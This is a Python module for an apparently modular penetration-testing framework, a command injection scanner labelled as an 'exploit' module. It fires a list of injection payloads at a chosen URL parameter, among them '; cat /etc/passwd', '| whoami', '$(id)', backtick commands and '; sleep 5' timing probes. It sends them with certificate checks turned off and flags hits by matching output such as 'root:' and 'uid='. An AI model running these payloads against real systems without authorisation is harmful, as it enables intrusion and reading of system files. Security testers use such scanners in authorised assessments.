"""Command Injection scanner module"""

import requests
import urllib.parse
import time
from colorama import Fore, Style
from modules.base import BaseModule

class CommandInjectionScanner(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Command Injection vulnerability scanner"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
        }
        self.required_options = ["URL", "PARAM"]
        
        self.payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "; dir",
            "| dir",
            "& dir",
            "&& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "; id",
            "| id",
            "& id",
            "&& id",
            "; uname -a",
            "| uname -a",
            "& uname -a",
            "&& uname -a",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`ls`",
            "`whoami`",
            "`id`",
            "$(ls)",
            "$(whoami)",
            "$(id)",
            "${IFS}ls",
            "%0als",
            "%0a id",
            "\n ls",
            "\n id",
        ]
        
        self.detection_patterns = [
            "root:",
            "bin/bash",
            "uid=",
            "gid=",
            "groups=",
            "Windows",
            "Volume Serial Number",
            "Directory of",
        ]
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        
        print(f"{Fore.YELLOW}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"{Fore.CYAN}[{i}/{len(self.payloads)}] Testing payload: {payload[:50]}...{Style.RESET_ALL}")
            
            vuln_type = self._test_payload(url, param, payload, method, timeout)
            if vuln_type:
                vulnerabilities.append({
                    "payload": payload,
                    "parameter": param,
                    "type": vuln_type
                })
                print(f"{Fore.RED}[!] VULNERABLE ({vuln_type})!{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential Command Injection vulnerabilities!{Style.RESET_ALL}\n")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  Type: {vuln['type']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Param: {vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Payload: {vuln['payload']}{Style.RESET_ALL}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"{Fore.GREEN}[+] No Command Injection vulnerabilities detected{Style.RESET_ALL}\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def _test_payload(self, url, param, payload, method, timeout):
        try:
            start_time = time.time()
            
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False)
            
            elapsed_time = time.time() - start_time
            
            for pattern in self.detection_patterns:
                if pattern in response.text:
                    return "Output-based Command Injection"
            
            if "sleep" in payload.lower() and elapsed_time >= 5:
                return "Time-based Command Injection"
            
        except requests.exceptions.Timeout:
            if "sleep" in payload.lower():
                return "Time-based Command Injection"
        except Exception:
            pass
        
        return None
